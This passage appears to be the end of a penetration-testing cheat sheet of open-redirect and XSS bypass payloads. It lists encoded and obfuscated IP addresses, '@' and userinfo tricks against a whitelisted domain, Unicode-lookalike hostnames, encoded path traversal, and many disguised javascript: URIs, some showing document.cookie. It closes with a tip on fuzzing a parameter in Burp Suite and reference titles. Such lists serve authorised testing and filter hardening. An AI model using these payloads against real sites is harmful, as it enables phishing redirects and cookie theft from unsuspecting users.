http://XY>.7d8T\205pZM@0330.072.0326.0316
http:XY>.7d8T\205pZM@0330.072.0326.0316
http://XY>.7d8T\205pZM@0xd8.072.54990
http:XY>.7d8T\205pZM@0xd8.072.54990
http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
http://XY>.7d8T\205pZM@0xd8.3856078
http:XY>.7d8T\205pZM@0xd8.3856078
http://XY>.7d8T\205pZM@0xd83ad6ce
http:XY>.7d8T\205pZM@0xd83ad6ce
http://XY>.7d8T\205pZM@[::216.58.214.206]
http:XY>.7d8T\205pZM@[::216.58.214.206]
http://XY>.7d8T\205pZM@3627734734
http:XY>.7d8T\205pZM@3627734734
http://XY>.7d8T\205pZM@472.314.470.462
http:XY>.7d8T\205pZM@472.314.470.462
http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
http://XY>.7d8T\205pZM@whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://XY>.7d8T\205pZM@whitelisted.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://XY>.7d8T\205pZM@whitelisted.com@google.com/
http://XY>.7d8T\205pZM@whitelisted.com+@google.com/
ja\nva\tscript\r:alert(1)
java%09script:alert(1)
java%0ascript:alert(1)
java%0d%0ascript%0d%0a:alert(0)
java%0dscript:alert(1)
Javas%26%2399;ript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\twhitelisted.com/
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/whitelisted.com
//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@whitelisted.com
//whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
//whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/whitelisted.com
whitelisted.com;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
//whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
//whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
//whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/\whitelisted.com:80%40google.com
whitelisted.com@%E2%80%AE@google.com
////whitelisted.com@google.com//
////whitelisted.com@google.com/
///whitelisted.com@google.com//
///whitelisted.com@google.com/
//whitelisted.com@google.com//
//whitelisted.com@google.com/
whitelisted.com;@google.com
whitelisted.com.google.com
////whitelisted.com@google.com/%2e%2e
///whitelisted.com@google.com/%2e%2e
////whitelisted.com@google.com/%2e%2e%2f
///whitelisted.com@google.com/%2e%2e%2f
//whitelisted.com@google.com/%2e%2e%2f
////whitelisted.com@google.com/%2f..
///whitelisted.com@google.com/%2f..
//whitelisted.com@google.com/%2f..
////whitelisted.com@google.com/%2f%2e%2e
///whitelisted.com@google.com/%2f%2e%2e
//whitelisted.com@google.com/%2f%2e%2e
//whitelisted.com+&@google.com#+@whitelisted.com/
//whitelisted.com@https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
//whitelisted.com@https:///google.com/%2e%2e
//whitelisted.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@whitelisted.com/
/x:1/:///%01javascript:alert(document.cookie)/
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
//XY>.7d8T\205pZM@whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//XY>.7d8T\205pZM@whitelisted.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//XY>.7d8T\205pZM@whitelisted.com@google.com/
//XY>.7d8T\205pZM@whitelisted.com+@google.com/
```

In the brupsuite, you can use `/xxx?Parameter_Payload={URL_payload}` to FUZZ.

## Reference:

- Open_redirect_part1
- Open_redirect_part2
- payload_github_url
- Open Redirect Cheat Sheet